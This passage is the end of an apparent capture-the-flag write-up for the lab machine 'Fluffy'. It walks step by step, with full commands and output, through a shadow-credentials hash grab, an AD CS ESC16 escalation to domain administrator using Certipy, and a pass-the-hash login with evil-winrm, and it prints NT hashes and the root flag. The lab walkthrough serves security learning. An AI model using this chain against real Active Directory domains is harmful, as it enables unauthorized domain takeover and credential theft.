[*] Adding Key Credential with device ID '58bbe192-9c06-7620-875d-3620d84f0e6f' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '58bbe192-9c06-7620-875d-3620d84f0e6f' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

### ESC16

```bash
└─$ faketime -f +7h certipy-ad find -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69' -vulnerable -text -stdout -dns-tcp
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

::: info :information_source: Note
I had version `v4.8.2` and it wasn't able to find ESC16, upgrading to latest `v5.0.2` worked.
:::

[https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally](https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)

For the attack we need a valid template, but `-vulnerable` was not able to find any. Get all certificates and check manually.
```bash
└─$ faketime -f +7h certipy-ad find -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69' -dns-tcp
└─$ cat 20250704185340_Certipy.txt | grep -e 'Template Name' -e 'ESC' -B1
...
--
  19
    Template Name                       : Machine
--
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  20
    Template Name                       : MachineEnrollmentAgent
--
...
--
  32
    Template Name                       : User
--
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.

└─$ grep 32 20250704185340_Certipy.txt -A100
  32
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : fluffy-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn, SubjectAltRequireEmail, SubjectRequireEmail, SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System, Secure Email, Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-04-17T16:10:16+00:00
    Template Last Modified              : 2025-04-17T16:10:16+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : FLUFFY.HTB\Domain Admins, FLUFFY.HTB\Domain Users, FLUFFY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : FLUFFY.HTB\Enterprise Admins
        Full Control Principals         : FLUFFY.HTB\Domain Admins, FLUFFY.HTB\Enterprise Admins
        Write Owner Principals          : FLUFFY.HTB\Domain Admins, FLUFFY.HTB\Enterprise Admins
        Write Dacl Principals           : FLUFFY.HTB\Domain Admins, FLUFFY.HTB\Enterprise Admins
        Write Property Enroll           : FLUFFY.HTB\Domain Admins, FLUFFY.HTB\Domain Users, FLUFFY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : FLUFFY.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

[AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

**Step 1**: Update UserPrincipalName (UPN) of target
```bash
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69' -dns-tcp -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

**Step 2**: Verify the Attribute Update
```bash
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69' -dns-tcp -user 'ca_svc' read

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-04T23:10:58+00:00
```

**Step 3**: Request Certificate as `administrator`
```bash
└─$ certipy-ad req -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69' -dns-tcp -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Step 4**: Revert the UPN Change
```bash
└─$ certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69' -dns-tcp -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

**Step 5**: Authenticate Using the Stolen Certificate
```bash
└─$ faketime -f +7h certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip '10.10.11.69'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

### Root.txt

```bash
└─$ evil-winrm -i 10.10.11.69 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
2df5513cafeee62bda62a40f5f226a74
```